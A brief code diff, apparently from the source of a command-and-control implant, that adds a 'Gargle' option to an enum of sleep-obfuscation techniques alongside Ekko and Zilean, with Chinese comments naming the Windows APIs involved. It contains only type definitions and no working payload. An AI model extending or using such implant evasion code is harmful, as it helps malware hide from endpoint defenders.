@@ -49,7 +49,8 @@ typedef struct SmbInternalProfile {
 typedef enum SleepObfTechnique {
     SLEEP_OBF_NONE = 0,        /* 不使用混淆 */
     SLEEP_OBF_EKKO = 1,        /* RtlCreateTimerQueue + NtContinue */
-    SLEEP_OBF_ZILEAN = 2       /* RtlRegisterWait */
+    SLEEP_OBF_ZILEAN = 2,      /* RtlRegisterWait */
+    SLEEP_OBF_GARGLE = 3       /* 当前线程 mask + 常规 wait，避免 NtContinue callback 链 */
 } SleepObfTechnique;
 
 /* sleep 混淆定位映像所需的预计算布局 */
